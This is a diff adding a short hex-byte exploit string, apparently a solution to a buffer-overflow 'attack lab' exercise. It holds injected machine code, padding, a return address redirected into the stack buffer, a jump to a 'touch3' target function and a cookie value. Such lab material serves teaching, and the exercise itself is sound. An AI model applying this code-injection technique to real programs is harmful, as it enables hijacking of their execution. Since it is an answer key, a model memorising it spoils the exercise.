@@ -1,0 +1,7 @@
+48 c7 c7 c0 60 66 55 c3
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+98 60 66 55 00 00 00 00 /* ret address to buf (address of *rsp) */
+c9 19 40 00 00 00 00 00 /* ret address to touch3 */
+/* cookie */
+32 39 38 37 38 63 38 63
